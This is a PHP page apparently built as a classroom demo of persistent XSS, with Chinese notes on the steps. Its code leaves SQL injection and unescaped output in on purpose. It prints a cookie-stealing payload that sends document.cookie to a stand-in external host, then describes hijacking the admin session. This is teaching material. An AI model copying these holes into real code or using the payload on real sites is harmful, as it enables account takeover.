<?php
session_start();
require_once("DB.php");

if(isset($_GET['logout']) && $_GET['logout']=="1"){
	unset($_SESSION['USER_NAME']);
}

if(!isset($_SESSION['USER_NAME'])) {
	echo "Need to login";
} else {
	echo "<h1>Welcome ".$_SESSION['USER_NAME']."</h1><hr>";
	
	if(isset($_POST['submit'])) {
		$query="update tb_user set display_name='".$_POST['disp_name']."' where user_name='".$_SESSION['USER_NAME']."';";
		$dbconn->query($query);
		echo "Update Success";
	} else {
		if(strcmp($_SESSION['USER_NAME'],'admin')==0) {
			echo "<h2>用户名列表：</h2>";
			$query = "select display_name from tb_user where user_name!='admin'";
			$res = $dbconn->query($query);
			echo "<ul>";
			while($row=mysql_fetch_array($res, MYSQL_ASSOC)) {
				echo "<li>$row[display_name]</li>";
			}
			echo "</ul>";
		}
	}
}
?>

<h1>Persistent XSS Attack</h1>
<hr />

<form name="tgs" id="tgs" method="post" action="xss_home.php">
修改姓名:<input type="text" id="disp_name" name="disp_name" value="">

<input name="submit" type="submit" value="Update">
</form>

<h2>Attack string:</h2>
<?php
echo htmlentities("<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">peishuaishuai01</a>");
?>

<h3>过程:</h3>
<ul>
<li>管理员登陆，能看到用户列表</li>
<li>普通用户登录，能更新个人信息</li>
<li>普通用户登陆后，填写攻击字符串</li>
<li>管理员登陆，点击被攻击的URL</li>
<li>攻击网站收到COOKIE</li>
<li>攻击者伪造COOKIE，登陆管理员后台</li>
</ul>

<h2><a href="xss_login.php">登陆页面</a>
<a href="xss_home.php?logout=1">退出</a></h2>